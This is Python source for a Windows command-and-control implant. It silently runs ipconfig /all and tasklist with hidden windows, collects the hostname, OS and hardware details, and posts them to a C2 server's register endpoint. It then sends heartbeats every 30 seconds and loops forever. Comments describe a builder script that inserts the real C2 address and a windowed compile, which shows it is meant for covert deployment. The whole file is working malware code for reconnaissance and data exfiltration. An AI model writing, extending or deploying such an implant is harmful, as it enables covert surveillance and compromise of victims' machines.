import os
import platform
import socket
import psutil
import subprocess
import json
import uuid
import time
import requests
import threading

# --- CONFIGURATION ---
# This URL will be replaced by the builder script.
C2_URL = "http://127.0.0.1:5002" 
HEARTBEAT_INTERVAL = 30 # Seconds

# --- DATA HARVESTING ---
def run_command(command):
    """Executes a shell command and returns its output."""
    try:
        # Use STARTUPINFO to hide the console window for the command
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.wShowWindow = subprocess.SW_HIDE
        result = subprocess.check_output(command, startupinfo=startupinfo, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        return result.decode('utf-8', errors='ignore').strip()
    except Exception:
        return ""

def get_system_info():
    """Gathers basic OS and hardware information."""
    info = ""
    info += f"Hostname: {socket.gethostname()}\n"
    info += f"OS: {platform.system()} {platform.release()} ({platform.version()})\n"
    info += f"Architecture: {platform.machine()}\n"
    info += f"Processor: {platform.processor()}\n"
    ram = psutil.virtual_memory()
    info += f"RAM: {ram.total / (1024**3):.2f} GB\n"
    return info

def get_network_info():
    """Gathers network configuration details."""
    return run_command(['ipconfig', '/all'])

def get_running_processes():
    """Lists currently running processes."""
    return run_command(['tasklist'])

def harvest_all_data():
    """Runs all data harvesting functions and formats the output."""
    all_data = {
        "System Info": get_system_info(),
        "Network Config": get_network_info(),
        "Running Processes": get_running_processes()
    }
    
    # Format the data into a clean, readable string
    formatted_output = ""
    for title, content in all_data.items():
        formatted_output += f"--- {title} ---\n\n{content}\n\n"
        
    return formatted_output.strip()

# --- C2 COMMUNICATION ---
def send_to_c2(endpoint, data):
    """Sends data to the specified C2 endpoint."""
    try:
        requests.post(f"{C2_URL}{endpoint}", json=data, timeout=15)
        return True
    except requests.RequestException:
        return False

def maintain_presence(session_id):
    """Continuously sends heartbeats to the C2 server."""
    while True:
        send_to_c2("/api/heartbeat", {"session_id": session_id})
        time.sleep(HEARTBEAT_INTERVAL)

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    session_id = str(uuid.uuid4())
    hostname = socket.gethostname()
    
    # Harvest all data upon initial execution
    harvested_data = harvest_all_data()
    
    # Create the initial registration payload
    registration_data = {
        "session_id": session_id,
        "hostname": hostname,
        "data": harvested_data
    }
    
    # Attempt to register with the C2. If successful, start heartbeating.
    if send_to_c2("/api/register", registration_data):
        # Start the heartbeat thread in the background
        heartbeat_thread = threading.Thread(target=maintain_presence, args=(session_id,), daemon=True)
        heartbeat_thread.start()
        
        # The main thread can exit, but the daemon thread will keep running as long as the process exists.
        # To keep the script alive (especially when compiled with --windowed), we need a loop.
        while True:
            time.sleep(60)